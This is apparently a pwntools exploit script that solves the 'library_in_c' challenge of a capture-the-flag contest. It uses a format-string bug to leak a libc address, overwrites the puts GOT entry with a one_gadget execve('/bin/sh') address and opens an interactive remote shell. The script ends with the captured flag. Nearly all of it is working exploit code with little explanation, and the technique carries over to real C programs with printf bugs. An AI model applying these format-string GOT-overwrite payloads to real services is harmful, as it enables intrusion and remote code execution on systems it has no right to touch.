from pwn import *


binpath = './library_in_c'
elf = ELF(binpath)
# libc = elf.libc
libc = ELF("./libc.so.6")


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'


gdbscript = '''
gef
# b *0x0000000004007F8
b *0x00000000040083E
c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('shell.actf.co', 20201)

"""
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

io.recvuntil(b'?\n')
payload = b''
payload += b'%00027$p'
payload += p64(elf.got['puts'])  # 9
io.sendline(payload)

io.recvuntil(b'there ')
data = io.recvline()
addr_libc = int(data[:data.find(b'\x18')], 16) - 0x20830
addr_gadget = addr_libc + 0x4526a
print('addr_libc = 0x{:x}'.format(addr_libc))
print('addr_gadget = 0x{:x}'.format(addr_gadget))

# io.recvuntil(b'?\n')

payload = b''

target = addr_gadget & 0xffff
fmt = b'%' + (b'%d' % target) + b'c'
fmt += b'%9$hn'
payload += fmt

written = target
target = (addr_gadget >> 16) & 0xffff
fmt = b'%' + (b'%d' % ((target - written - 1) % (1 << 16) + 1)) + b'c'
fmt += b'%23$hn'
payload += fmt

payload += b'A' * (0x38 - len(payload))
payload += p64(elf.got['puts'] + 2)  # 23

io.sendline(payload)

io.interactive()


# actf{us1ng_c_15_n3v3r_4_g00d_1d34}
